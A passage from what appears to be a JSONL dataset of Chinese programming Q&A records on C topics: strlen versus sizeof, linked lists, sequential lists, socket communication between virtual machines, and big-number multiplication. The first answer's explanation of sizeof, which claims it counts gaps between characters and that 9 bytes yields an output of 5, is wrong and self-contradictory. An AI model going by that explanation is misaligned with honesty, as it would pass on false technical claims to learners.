5&lt;/span&gt;\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;因此在代码中&amp;#xff0c;strlen 函数计算的是数组中所有字符的个数&amp;#xff0c;因此输出的是 8。&lt;/p&gt;\n&lt;p&gt;而 sizeof 返回的是数组的总大小&amp;#xff0c;包括所有的字符和字符之间的间隔。在代码中&amp;#xff0c;数组的总大小是 5 个字符加上 4 个间隔&amp;#xff0c;即 5*1&amp;#43;4&amp;#61;9 个字节&amp;#xff0c;因此输出的是 5。&lt;br /&gt;望采纳。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["为什么输出结果是这样的？", ["\n", "strlen函数为什么是8而sizeof是5，不应该strlen是到＼0那不应该是5吗"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;修改如下&amp;#xff0c;供参考&amp;#xff1a;&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-c&amp;#43;&amp;#43;\"&gt;&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-keyword\"&gt;typedef&lt;/span&gt; &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; elemtype;\n&lt;span class=\"hljs-keyword\"&gt;typedef&lt;/span&gt; &lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; &lt;span class=\"hljs-title class_\"&gt;_LNode&lt;/span&gt; {\n    elemtype data;\n    &lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; &lt;span class=\"hljs-title class_\"&gt;_LNode&lt;/span&gt;* next;\n}LNode;\n\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;void&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;Initlist&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(LNode* a)&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-comment\"&gt;//a &amp;#61; (LNode*)malloc(sizeof(LNode));修改&lt;/span&gt;\n    a-&amp;gt;next &amp;#61; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;;\n}&lt;span class=\"hljs-comment\"&gt;//;&lt;/span&gt;\n\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;void&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;Headinsert&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(LNode* a, &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; n)&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-comment\"&gt;//a &amp;#61; (LNode*)malloc(sizeof(LNode));修改&lt;/span&gt;\n    a-&amp;gt;next &amp;#61; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;;\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i &amp;#61; n; i &amp;gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; i--)\n    {\n        LNode* p &amp;#61; (LNode*)&lt;span class=\"hljs-built_in\"&gt;malloc&lt;/span&gt;(&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(LNode));\n        &lt;span class=\"hljs-built_in\"&gt;scanf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d&amp;#34;&lt;/span&gt;, &amp;amp;(p-&amp;gt;data));\n\n        p-&amp;gt;next &amp;#61; a-&amp;gt;next;\n        a-&amp;gt;next &amp;#61; p;\n    }&lt;span class=\"hljs-comment\"&gt;//;&lt;/span&gt;\n}&lt;span class=\"hljs-comment\"&gt;//;&lt;/span&gt;\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;void&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;printlinklist&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(LNode* a)&lt;/span&gt;\n&lt;/span&gt;{\n    LNode* q &amp;#61; a-&amp;gt;next; &lt;span class=\"hljs-comment\"&gt;//LNode* q &amp;#61; a;修改&lt;/span&gt;\n    &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt; (q!&amp;#61;&lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;)\n    {\n        &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d &amp;#34;&lt;/span&gt;, q-&amp;gt;data);\n        q &amp;#61; q-&amp;gt;next;\n    }&lt;span class=\"hljs-comment\"&gt;//;&lt;/span&gt;\n}&lt;span class=\"hljs-comment\"&gt;//;&lt;/span&gt;\n\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;main&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(&lt;span class=\"hljs-type\"&gt;void&lt;/span&gt;)&lt;/span&gt;\n\n&lt;/span&gt;{\n    LNode L; &lt;span class=\"hljs-comment\"&gt;//定义了链表的头结点&lt;/span&gt;\n    &lt;span class=\"hljs-built_in\"&gt;Initlist&lt;/span&gt;(&amp;amp;L);\n    &lt;span class=\"hljs-built_in\"&gt;Headinsert&lt;/span&gt;(&amp;amp;L, &lt;span class=\"hljs-number\"&gt;3&lt;/span&gt;);\n    &lt;span class=\"hljs-built_in\"&gt;printlinklist&lt;/span&gt;(&amp;amp;L);\n\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\n\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["输入后，打印出乱码，而且使用f11运行不了，在printf(\"%d\"，q->data)", ["#include<stdio.h>", "#include<malloc.h>", "\n", "\n", "typedef int elemtype;", "typedef struct LNode {", "    elemtype data;", "    struct LNode* next;", "\n", "} LNode;", "\n", "void Initlist(LNode* a)", "{", "    a = (LNode*)malloc(sizeof(LNode));", "    a->next = NULL;", "\n", "};", "\n", "void Headinsert(LNode* a, int n)", "{", "    a = (LNode*)malloc(sizeof(LNode));", "    a->next = NULL;", "    for (int i = n; i > 0; i--)", "    {", "        LNode* p = (LNode*)malloc(sizeof(LNode));", "        scanf_s(\"%d\", &(p->data));", "\n", "    ", "p", "->", "next", " = a->", "next;\n    ", "a", "->", "next = p;\n\n};\n", "\n", "};", "void printlinklist(LNode* a)", "{", "\n", "LNode* q = a;\n", "while", " (q!=NULL)\n{\n    \n    ", "printf", "(\"%d\", q->", "data", ");\n    ", "q", " = q->", "next;\n};\n", "\n", "};", "\n", "int main(void)", "\n", "{", "    LNode L;", "    Initlist(&L);", "\n", "Headinsert(", "&L, 3);", "\n\nprintlinklist(", "&L);", "\n", "\n", "};"]], "Tag": "程序设计"}
{"Answer": "C++才有new\r\nnewbase= new ElemType[listsize+LISTINCREMENT];", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言数据结构顺序表，存储空间已满,增加分配", ["/* 当前存储空间已满,增加分配 */", "\n\n", "newbase=(ElemType *)realloc(L.elem,(L.listsize+LISTINCREMENT)*sizeof(ElemType));\n\n\n这句怎么改为用new表达？\nnewbase=new        //怎么写这句\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;a是指针&amp;#xff0c;sizeof(a)得到的大小是指针的大小&amp;#xff0c;在32为系统中&amp;#xff0c;指针的大小是4&amp;#xff0c;64位系统中&amp;#xff0c;指针的大小是8.。所以你的逻辑是错误的。&lt;br /&gt;既然你的结构体中已经定义了length来记录数组的实际长度&amp;#xff0c;所以&amp;#xff0c;在插入链表的时候&amp;#xff0c;用a-&amp;gt;length就可以了。&lt;br /&gt;代码修改如下&amp;#xff08;修改部分代码中有注释&amp;#xff09;&amp;#xff1a;&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;\ntypedef &lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; {\n    elemtype data[sizemax];\n    &lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; length;\n\n}seqlist;\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-keyword\"&gt;void&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;InitList&lt;/span&gt;(&lt;span class=\"hljs-params\"&gt;seqlist* a, &lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; b&lt;/span&gt;)&lt;/span&gt; {\n    &lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; i;\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; i &amp;lt; b; i&amp;#43;&amp;#43;)\n    {\n        a-&amp;gt;data[i] &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n\n    };\n    a-&amp;gt;length &amp;#61; b; &lt;span class=\"hljs-comment\"&gt;//修改1  这里记录初始长度&lt;/span&gt;\n};\n\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-keyword\"&gt;void&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;Insertlist&lt;/span&gt;(&lt;span class=\"hljs-params\"&gt;seqlist* a, &lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; b, &lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; c&lt;/span&gt;)&lt;/span&gt;\n{\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; j &amp;#61; a-&amp;gt;length &lt;span class=\"hljs-number\"&gt;-1&lt;/span&gt;; j &amp;gt;&amp;#61; c - &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;; j--) &lt;span class=\"hljs-comment\"&gt;//修改2  j从a-&amp;gt;length-1开始&lt;/span&gt;\n    {\n        a-&amp;gt;data[j &amp;#43; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;] &amp;#61; a-&amp;gt;data[j];\n    };\n    a-&amp;gt;data[c - &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;] &amp;#61; b;\n    a-&amp;gt;length &amp;#43;&amp;#61; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;; &lt;span class=\"hljs-comment\"&gt;//修改3  长度&amp;#43;1&lt;/span&gt;\n};\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;main&lt;/span&gt;(&lt;span class=\"hljs-params\"&gt;&lt;/span&gt;)&lt;/span&gt;\n{\n    &lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-keyword\"&gt;base&lt;/span&gt;[&lt;span class=\"hljs-number\"&gt;9&lt;/span&gt;] &amp;#61; { &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;2&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;10&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;4&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;5&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;6&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;3&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;8&lt;/span&gt; };\n    seqlist insert;\n    &lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; N &amp;#61; &lt;span class=\"hljs-keyword\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-keyword\"&gt;base&lt;/span&gt;) / &lt;span class=\"hljs-keyword\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-keyword\"&gt;base&lt;/span&gt;[&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;]);\n    InitList(&amp;amp;insert, N);\n\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=\"hljs-number\"&gt;9&lt;/span&gt;; i&amp;#43;&amp;#43;) {\n        insert.data[i] &amp;#61; &lt;span class=\"hljs-keyword\"&gt;base&lt;/span&gt;[i];\n    };\n    Insertlist(&amp;amp;insert, &lt;span class=\"hljs-number\"&gt;7&lt;/span&gt;, &lt;span class=\"hljs-number\"&gt;3&lt;/span&gt;);\n\n\n\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\n\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["前面运行正常，到了Insertlist就跳过，不运行，", ["typedef struct {", "    elemtype data[sizemax];", "    int length;", "\n", "}seqlist;", "void InitList(seqlist* a, int b) {", "    int i;", "    for (i = 0; i < b; i++)", "    {", "        a->data[i] = 0;", "\n", "}", ";", "\n", "\n", "};", "\n", "void  Insertlist(seqlist* a, int b, int c)", "{", "\n", "for", " (int j = sizeof(a) / sizeof(a[", "0", "])- ", "1", "; j >=  c - ", "1", "; j", "--)", "\n{\n    a->", "data", "[j + 1] = a->", "data", "[j];};", "\n", "a", "->", "data", "[c - 1] = b;", "\n", "\n", "};", "int main()", "{", "    int base[9] = { 1,2,10,4,5,6,3,8 };", "    seqlist insert;", "    int N = sizeof(base) / sizeof(base[0]);", "    InitList(&insert, N);", "\n", "for (int i = ", "0", "; i < 9; i++) {", "\n    ", "insert.data[i] ", "= ", "base[i];\n", "\n};\n", "Insertlist(&insert, ", "7", ", ", "3", ");\n\n\n\nreturn ", "0", ";\n", "\n", " }"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;错误挺多的&amp;#xff1a;&lt;br /&gt;&amp;#xff08;1&amp;#xff09;给c申请的空间应该是a[sz-1]&amp;#43;1个&amp;#xff0c;不是a[sz-1]&amp;#xff0c;因为下标是从0开始&amp;#xff0c;a[sz-1]的时候&amp;#xff0c;最大值是a[sz-1]-1&lt;br /&gt;memset(c, 0, a[sz-1]);这里&amp;#xff0c;应该是 memset(c, 0, (a[sz-1]&amp;#43;1)*sizeof(int));&lt;br /&gt;&amp;#xff08;2&amp;#xff09;第17行的遍历&amp;#xff0c;不应该是i &amp;lt;sz&amp;#xff0c;应该是 i &amp;lt; a[sz-1]&amp;#43;1&lt;br /&gt;&amp;#xff08;3&amp;#xff09;if (c[a[i]] &amp;#61;&amp;#61; 1)这里&amp;#xff0c;应该是 if (c[i] &amp;#61;&amp;#61; 1)&amp;#xff0c;printf中显示的不应该是a[i]&amp;#xff0c;而是 i&amp;#xff0c;因为c中的i代表的就是数组a中的元素&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;p class=\"md_img_container\"&gt;&lt;img align=\"left\" alt=\"img\" src=\"https://img-mid.csdnimg.cn/release/static/image/mid/ask/370036777346135.png\" class=\"md_img\" /&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;代码修改如下&amp;#xff1a;&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;intrin.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;compare&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(&lt;span class=\"hljs-keyword\"&gt;const&lt;/span&gt; &lt;span class=\"hljs-type\"&gt;void&lt;/span&gt;* a,&lt;span class=\"hljs-keyword\"&gt;const&lt;/span&gt; &lt;span class=\"hljs-type\"&gt;void&lt;/span&gt;* b)&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; (*(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;*)a - *(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;*)b);\n}\n\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;void&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;differ&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;* a,&lt;span class=\"hljs-keyword\"&gt;const&lt;/span&gt; &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; sz)&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-built_in\"&gt;qsort&lt;/span&gt;(a, sz, &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;), compare);\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;* c &amp;#61; (&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;*)&lt;span class=\"hljs-built_in\"&gt;malloc&lt;/span&gt;(&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;)* (a[sz&lt;span class=\"hljs-number\"&gt;-1&lt;/span&gt;]&amp;#43;&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;));\n    &lt;span class=\"hljs-built_in\"&gt;memset&lt;/span&gt;(c, &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;, (a[sz&lt;span class=\"hljs-number\"&gt;-1&lt;/span&gt;]&amp;#43;&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;)*&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;));\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; i &amp;lt; sz; i&amp;#43;&amp;#43;)\n    {\n        c[a[i]]&amp;#43;&amp;#43;;\n    }\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; i &amp;lt; a[sz&lt;span class=\"hljs-number\"&gt;-1&lt;/span&gt;]&amp;#43;&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;; i&amp;#43;&amp;#43;)\n    {\n        &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (c[i] &amp;#61;&amp;#61; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;)\n        {\n            &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d &amp;#34;&lt;/span&gt;,i);\n        }\n    }\n}\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;main&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;()&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; a[] &amp;#61; { &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;2&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;3&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;4&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;3&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;4&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;5&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;5&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;6&lt;/span&gt; };\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; sz &amp;#61; &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(a) / &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(a[&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;]);\n    &lt;span class=\"hljs-built_in\"&gt;differ&lt;/span&gt;(a,sz);\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}   \n\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["找不重复数，不知道哪里出了毛病", ["\n", "\n", "int", " ", "compare", "(", "const", " ", "void", "* a,", "const", " ", "void", "* b", ")", "\n{\n    ", "return", " (*(", "int", "*)a - *(", "int", "*)b);\n}\n\n", "void", " ", "differ", "(", "int", "* a,", "const", " ", "int", " sz", ")", "\n{\n    qsort(a, sz, ", "sizeof", "(", "int", "), compare);\n    ", "int", "* c = (", "int", "*)malloc(", "sizeof", "(", "int", ")* a[sz", "-1", "]);\n    memset(c, ", "0", ", a[sz", "-1", "]);\n    ", "int", " i = ", "0", ";\n    ", "for", " (i = ", "0", "; i < sz; i++)\n    {\n        c[a[i]] ++;\n    }\n    ", "for", " (i = ", "0", "; i <sz; i++)\n    {\n        ", "if", " (c[a[i]] == ", "1", ")\n        {\n            printf(", "\"%d \"", ",a[i]);\n        }\n    }\n}\n", "int", " ", "main", "(", ")", "\n{\n    ", "int", " a[] = { ", "1", ",", "2", ",", "1", ",", "3", ",", "4", ",", "3", ",", "4", ",", "5", ",", "5", ",", "6", " };\n    ", "int", " sz = ", "sizeof", "(a) / ", "sizeof", "(a[", "0", "]);\n    differ(a,sz);\n    ", "return", " ", "0", ";\n}   \n", "\n", "我的思路感觉应该没有毛病,但最后输不出结果,不知道怎么肥四"]], "Tag": "程序设计"}
{"Answer": "NAT你除非端口映射出去才行，但访问的也上HOST的地址，而不是虚拟机的地址了，其实你开了服务端程序，然后telnet一下，不通就是不通了。\r\n你可以用Host only方式或桥接的方式，Host only方式虚拟机之间是可以通迅的，外网要另外设置\r\n桥接方式如果你自己用的是路由上网，地址应该和路由地址是同一网段的，随便乱设置是上不了网的", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["socket通信在一个虚拟机开两个终端可以通信，换成两个虚拟机出错", ["在一个虚拟机里开两个终端可以实现通信，但是换成两个虚拟机就在connect函数那里失败了，返回-1，输出的错误提示是：connect:connection timed out。我在网上搜了很久都解决不了。我的设备是virtualbox里的两台ubuntu虚拟机，ip地址分别为10.0.2.15和10.0.3.15，能上网，能ping通，防火墙已关闭，端口没被占用，请问这可能是什么原因呢？", "\n服务器端", "\n\n", "#include <sys/types.h>\n#include <sys/socket.h>\n#include <stdio.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <unistd.h>\n#include <string.h>\n#include <stdlib.h>\n#include <fcntl.h>\n#include <sys/shm.h>\n\n#define MYPORT  8887\n#define QUEUE   20\n#define BUFFER_SIZE 1024\n\nint main()\n{\n    ///定义sockfd\n    int server_sockfd = socket(AF_INET,SOCK_STREAM, 0);\n\n    ///定义sockaddr_in\n    struct sockaddr_in server_sockaddr;\n    server_sockaddr.sin_family = AF_INET;\n    server_sockaddr.sin_port = htons(MYPORT);\n    server_sockaddr.sin_addr.s_addr = htonl(INADDR_ANY);\n\n    ///bind，成功返回0，出错返回-1\n    if(bind(server_sockfd,(struct sockaddr *)&server_sockaddr,sizeof(server_sockaddr))==-1)\n    {\n        perror(\"bind\");\n        exit(1);\n    }\n\n    ///listen，成功返回0，出错返回-1\n    if(listen(server_sockfd,QUEUE) == -1)\n    {\n        perror(\"listen\");\n        exit(1);\n    }\n\n    ///客户端套接字\n    char buffer[BUFFER_SIZE];\n    struct sockaddr_in client_addr;\n    socklen_t length = sizeof(client_addr);\n\n    ///成功返回非负描述字，出错返回-1\n    int conn = accept(server_sockfd, (struct sockaddr*)&client_addr, &length);\n    if(conn<0)\n    {\n        perror(\"connect\");\n        exit(1);\n    }\n\n    while(1)\n    {\n        memset(buffer,0,sizeof(buffer));\n        int len = recv(conn, buffer, sizeof(buffer),0);\n        if(strcmp(buffer,\"exit\\n\")==0)\n            break;\n        fputs(buffer, stdout);\n        send(conn, buffer, len, 0);\n    }\n    close(conn);\n    close(server_sockfd);\n    return 0;\n}\n", "\n\n", "客户端", "\n\n", " #include <sys/types.h>\n#include <sys/socket.h>\n#include <stdio.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <unistd.h>\n#include <string.h>\n#include <stdlib.h>\n#include <fcntl.h>\n#include <sys/shm.h>\n\n#define MYPORT  8887\n#define BUFFER_SIZE 1024\n\nint main()\n{\n    ///定义sockfd\n    int sock_cli = socket(AF_INET,SOCK_STREAM, 0);\n\n    ///定义sockaddr_in\n    struct sockaddr_in servaddr;\n    memset(&servaddr, 0, sizeof(servaddr));\n    servaddr.sin_family = AF_INET;\n    servaddr.sin_port = htons(MYPORT);  ///服务器端口\n    servaddr.sin_addr.s_addr = inet_addr(\"10.0.3.15\");  ///服务器ip\n\n    ///连接服务器，成功返回0，错误返回-1\n    if (connect(sock_cli, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0)\n    {\n        perror(\"connect\");\n        exit(1);\n    }\n\n    char sendbuf[BUFFER_SIZE];\n    char recvbuf[BUFFER_SIZE];\n    while (fgets(sendbuf, sizeof(sendbuf), stdin) != NULL)\n    {\n        send(sock_cli, sendbuf, strlen(sendbuf),0); ///发送\n        if(strcmp(sendbuf,\"exit\\n\")==0)\n            break;\n        recv(sock_cli, recvbuf, sizeof(recvbuf),0); ///接收\n        fputs(recvbuf, stdout);\n\n        memset(sendbuf, 0, sizeof(sendbuf));\n        memset(recvbuf, 0, sizeof(recvbuf));\n    }\n\n    close(sock_cli);\n    return 0;\n}\n", "\n\n", "代码来自博客园--旭东的博客，谢谢博主。", "原博客链接"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;你如果要模拟列竖式&amp;#xff0c;那你的所有中间结果也都应该用char[]来存啊&amp;#xff0c;不要依赖long long int类型来保存中间结果&amp;#xff0c;否则输入大到一定程度&amp;#xff0c;中间结果溢出了&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["我的高精度乘法运算算法 为什么位数不能超过105位？", ["进行高精度乘法运算时当数字输入位数超过大概105位时结果是错误的，此后随着输入位数的增加错误的位数也就越多，请问到底是怎么回事呢？", "又该如何解决这个问题呢？", "我的算法是模仿人类列竖式计算", "\n", "下面是代码 乘法函数为BIgMultiply函数", "\n", "#define _CRT_SECURE_NO_DEPRECATE", "\n", "#pragma warning(disable:4996)    //使scanf()函数可用", "\n\n", "#include<stdio.h>", "\n", "#include<stdlib.h>", "\n", "#include<string.h>", "\n", "#define N 205     //精度（数字位数） +2", "\n\n", "//", "将字符串变为倒序\nvoid reverse(char a[]) {\n    static char a2[N];\n    memset(a2, ", "0", ", sizeof(a2));\n    int xa = strlen(a) - ", "1", ";\n    int j = ", "0", ";\n\n    ", "for", " (int i = xa; i >= ", "0", "; i--) {\n        a2[j] = a[i];\n        j++;\n    }\n    memset(a, ", "0", ", sizeof(a));\n    strcpy(a, a2);\n}\n\n", "//", "将字符串换算为真实数字\nvoid str2numArry(char a[]) {\n    ", "for", " (int i = ", "0", "; a[i] != ", "'\\0'", "; i++) {\n        a[i] -= ", "'0'", ";\n    }\n}\n\nint strGetLongest(char a[], char b[]) {\n    int xa = strlen(a);\n    int xb = strlen(b);\n    int longest = xb;\n    ", "if", " (xa >= xb) {\n        longest = xa;\n    }\n    return longest;\n}\n\n", "//", "运算得出的out[]是逆序的\n\nvoid BigPlus(char ia[], char ib[], char ResultGet[]) {\n    static char out[N], a[N], b[N];\n    int JW;", "//", "进位\n    ", "//", "初始化\n    memset(out, ", "0", ", sizeof(out));\n    memset(a, ", "0", ", sizeof(a));\n    memset(b, ", "0", ", sizeof(b));\n    memset(ResultGet, ", "0", ", sizeof(ResultGet));\n    strcpy(a, ia);\n    strcpy(b, ib);\n    ", "//", "先将数字倒序(因为列竖式时需要右对齐且从需要从右往左算)\n    reverse(a);\n    reverse(b);\n\n    ", "//", "取a,b之中最长的 长度？\n    int longest = strGetLongest(a, b);\n    ", "//", "换算为真实数字\n    str2numArry(a);\n    str2numArry(b);\n    ", "//", "因为转换为真实数字之后末尾的‘", "0", "’会变成‘\\", "0", "’，又因为数组经过倒序处理，所以先导零将变成字符串结尾 ", "'\\0'", " 将被忽略。\n    ", "//", "运算\n    JW = ", "0", ";\n    ", "for", " (int i = ", "0", "; i <= longest; i++) {\n        out[i] = a[i] + b[i] + JW;\n        JW = ", "0", ";\n        ", "if", " (out[i] >= ", "10", ") {\n            JW = out[i] / ", "10", ";\n            out[i] %= ", "10", ";\n        }\n    }\n\n    int j = ", "0", ";\n    ", "while", " (out[longest] == ", "0", " && longest > ", "0", ") {\n        longest--;\n    }\n 